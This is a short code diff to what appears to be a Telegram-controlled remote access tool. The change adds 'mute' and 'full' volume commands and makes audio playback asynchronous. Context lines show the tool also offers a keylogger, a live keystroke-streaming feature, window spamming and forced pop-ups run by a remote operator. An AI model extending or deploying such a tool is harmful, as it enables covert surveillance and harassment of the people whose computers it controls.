@@ -25,7 +25,7 @@ from ctypes import cast, POINTER
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 try:
-    from winsound import PlaySound, SND_FILENAME
+    from winsound import PlaySound, SND_FILENAME, SND_ASYNC
 except ImportError:
     PlaySound = lambda *args:args
     SND_FILENAME = None
@@ -141,6 +141,8 @@ keylogger - Records pressed keys on keyboard.
 livekeylogger - Sends live updates about what's being typed on the keyboard.
 setvolume - Set computer's volume level.
 getvolume - Gets the computer's volume level.
+mute - Set computer's volume to 0.
+full - Set computer's volume to 100.
 
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending an audio/voice* - Will play the audio/voice in the background.
@@ -500,6 +502,12 @@ class CustomMixer:
         current_volume = round(self.volume.GetMasterVolumeLevelScalar()*100)
         return current_volume
 
+    def mute(self) -> None:
+        self.setVolumePercentage(0)
+
+    def full(self) -> None:
+        self.setVolumePercentage(100)
+
 
 """
 ooooooooo.     .oooooo.   ooooooooo.
@@ -560,6 +568,8 @@ class PeppinoTelegram:
             "setvolume":self.audio_mixer.setVolumePercentage,
             "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
             "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
+            "mute":lambda:self.audio_mixer.mute(),
+            "full":lambda:self.audio_mixer.full()
         }
         self.no_background_functions = [self.message_box, self.spam_windows]
     
@@ -977,7 +987,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         else:
             audio = self.audios[audio]
         imageThread = Thread(target=show_image_fullscreen ,args=(image,))
-        audioThread = Thread(target=PlaySound, args=(audio,SND_FILENAME))
+        audioThread = Thread(target=PlaySound, args=(audio,SND_FILENAME,SND_ASYNC))
         if playaudio:
             audioThread.start()
         if showimage:
